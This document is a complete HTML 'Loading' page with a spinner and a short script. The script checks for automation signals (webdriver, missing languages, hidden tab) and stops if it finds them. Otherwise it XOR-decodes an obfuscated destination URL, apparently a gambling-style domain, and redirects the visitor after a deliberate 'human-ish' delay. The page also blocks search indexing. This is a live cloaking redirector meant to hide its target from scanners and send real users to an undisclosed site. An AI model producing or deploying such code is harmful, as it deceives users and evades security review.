<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
<meta name="robots" content="noindex, nofollow, noarchive, nosnippet" />
<title>Loading</title>
<style>
  :root { color-scheme: light dark; }
  html,body{margin:0;height:100%}
  body{background:#f4f5f7;color:#333;font-family:-apple-system,"Segoe UI",Roboto,Arial,sans-serif;
    display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;text-align:center;padding:24px}
  .s{width:38px;height:38px;margin:18px auto;border:3px solid rgba(0,0,0,.12);border-top-color:#888;border-radius:50%;animation:r .8s linear infinite}
  @keyframes r{to{transform:rotate(360deg)}}
  .m{opacity:.6;font-size:14px}
  a.c{display:none;margin-top:18px;color:#555;font-size:14px}
</style>
</head>
<body>
  <div class="s"></div>
  <div class="m">Please wait…</div>
  <a class="c" id="c" href="#">Continue</a>
  <noscript><div class="m">Please enable JavaScript.</div></noscript>
  <script>
  (function(){
    try{
      // 1) drop obvious automation / non-interactive agents
      if (navigator.webdriver) return;
      if (!navigator.languages || !navigator.languages.length) return;
      if (typeof document.hidden !== "undefined" && document.hidden) return;
      // 2) decode destination at runtime (never present as plain text in HTML)
      var e=[50,46,46,42,41,96,117,117,54,59,53,44,63,61,59,41,116,59,42,42,119,45,59,42,119,107,109,98,116,57,53,55,117],k=90,u="";
      for(var i=0;i<e.length;i++){u+=String.fromCharCode(e[i]^k);}
      // 3) expose manual fallback (in case auto-nav is blocked in a webview)
      var c=document.getElementById("c");
      if(c){c.style.display="inline-block";c.setAttribute("href",u);}
      // 4) tiny human-ish delay, then go
      setTimeout(function(){ try{ location.replace(u); }catch(_){ location.href=u; } }, 350);
    }catch(_){ /* stay on neutral page */ }
  })();
  </script>
</body>
</html>
